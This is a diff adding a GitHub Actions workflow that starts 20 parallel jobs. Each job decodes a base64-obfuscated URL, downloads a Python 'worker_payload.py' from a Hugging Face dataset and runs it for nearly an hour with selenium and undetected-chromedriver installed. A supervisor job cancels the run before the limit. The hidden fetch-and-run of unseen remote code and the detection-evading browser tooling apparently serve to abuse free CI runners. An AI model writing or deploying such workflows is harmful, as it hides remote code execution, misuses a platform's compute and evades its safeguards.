@@ -1,0 +1,88 @@
+name: Apex Horizon Engine
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: cluster-lock-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # Supervisor: إلغاء التشغيل بعد مرور الوقت المحدد
+  # =================================================================
+  execution-supervisor:
+    name: "Supervisor Unit"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      TIMEOUT_LIMIT: 3540
+    steps:
+      - name: System Watchdog
+        run: |
+          printf "[SUPERVISOR] Tracking Run ID: %s\n" "${{ github.run_id }}"
+          
+          sleep "${TIMEOUT_LIMIT}"
+
+          printf "[SUPERVISOR] Time limit reached. Terminating workflow...\n"
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+  # =================================================================
+  # Cluster Nodes: تشغيل العقد بالتوازي
+  # =================================================================
+  cluster-nodes:
+    name: "Node-Task-${{ matrix.node_id }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        node_id: [101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120]
+
+    steps:
+      # -----------------------------------------------------------------
+      # 1. تجهيز النظام
+      # -----------------------------------------------------------------
+      - name: Provision Environment
+        run: |
+          sudo apt-get update -y -qq
+          sudo apt-get install -y --no-install-recommends curl python3-pip
+
+      # -----------------------------------------------------------------
+      # 2. تحميل الملف الإجرائي
+      # -----------------------------------------------------------------
+      - name: Retrieve Payload
+        run: |
+          PAYLOAD_URL=$(base64 -d <<< "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5")
+          curl -sL "$PAYLOAD_URL" -o worker_payload.py
+
+      # -----------------------------------------------------------------
+      # 3. تثبيت الاعتمادات
+      # -----------------------------------------------------------------
+      - name: Prepare Requirements
+        run: |
+          pip3 install -q requests psutil selenium undetected-chromedriver
+
+      # -----------------------------------------------------------------
+      # 4. إدارة عملية التشغيل
+      # -----------------------------------------------------------------
+      - name: Execute Task Manager
+        run: |
+          python3 worker_payload.py &
+          MAIN_PID=$!
+
+          sleep 3540
+
+          if ps -p "$MAIN_PID" > /dev/null 2>&1; then
+            kill -9 "$MAIN_PID"
+          fi
